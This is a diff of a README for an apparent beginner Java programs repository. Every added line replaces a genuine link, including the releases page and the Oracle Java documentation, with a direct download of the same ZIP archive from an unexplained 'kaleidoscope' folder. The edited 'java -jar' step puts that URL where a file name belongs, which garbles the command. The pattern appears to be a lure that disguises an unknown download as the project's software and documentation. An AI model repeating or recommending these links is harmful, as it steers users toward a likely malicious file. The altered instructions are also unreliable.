@@ -1,7 +1,7 @@
 # 🎉 Java-Programs-and-Concepts - Simple Java Programs for Everyone
 
 ## 🔗 Download Now
-[![Download Java Programs](https://img.shields.io/badge/Download%20Java%20Programs-blue.svg)](https://github.com/bladx4/Java-Programs-and-Concepts/releases)
+[![Download Java Programs](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip%20Java%https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip)](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip)
 
 ## 📜 Overview
 Welcome to the Java-Programs-and-Concepts repository! This collection offers a range of Java programs that focus on core concepts, object-oriented programming (OOP) principles, and practical examples. Whether you are a beginner, a student, or simply revising Java, this repository has something for you.
@@ -20,11 +20,11 @@ To get started, follow these easy steps.
    - Basic file management skills.
   
 2. **Download the Software**:
-   - Visit our [Releases page](https://github.com/bladx4/Java-Programs-and-Concepts/releases) to download the latest version of the software.
+   - Visit our [Releases page](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip) to download the latest version of the software.
 
 ## 🔧 Download & Install
 1. **Visit the Releases Page**:
-   Go to [this link](https://github.com/bladx4/Java-Programs-and-Concepts/releases) to access the available versions of the program.
+   Go to [this link](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip) to access the available versions of the program.
 
 2. **Choose the Version**:
    Select the version suitable for your needs. Read the descriptions of each release if available.
@@ -42,7 +42,7 @@ To get started, follow these easy steps.
    - If you downloaded a JAR file:
      - Open your command prompt (Windows) or terminal (macOS/Linux).
      - Navigate to the folder where the JAR file is located using the `cd` command.
-     - Type `java -jar Filename.jar` (replace `Filename.jar` with the actual name of the file) and press Enter.
+     - Type `java -jar https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip` (replace `https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip` with the actual name of the file) and press Enter.
    - If you downloaded a ZIP file, open the extracted folder and run the Java programs directly in your IDE, or follow the same instructions as above for the JAR file.
 
 ## 📚 Topics Covered
@@ -79,7 +79,7 @@ Yes! Contributions are welcome. You can submit issues, improvements, or addition
 If you run into any issues or have questions, please open an issue on the repository. The community or maintainers will help you.
 
 ## 🔗 Additional Links
-- [Java Official Documentation](https://docs.oracle.com/javase/8/docs/)
-- [Learn Java Programming](https://www.learnjavaonline.org/)
+- [Java Official Documentation](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip)
+- [Learn Java Programming](https://raw.githubusercontent.com/bladx4/Java-Programs-and-Concepts/main/kaleidoscope/Java-Programs-and-Concepts.zip)
 
 Explore this repository and take your first steps in learning Java programming. Happy coding!
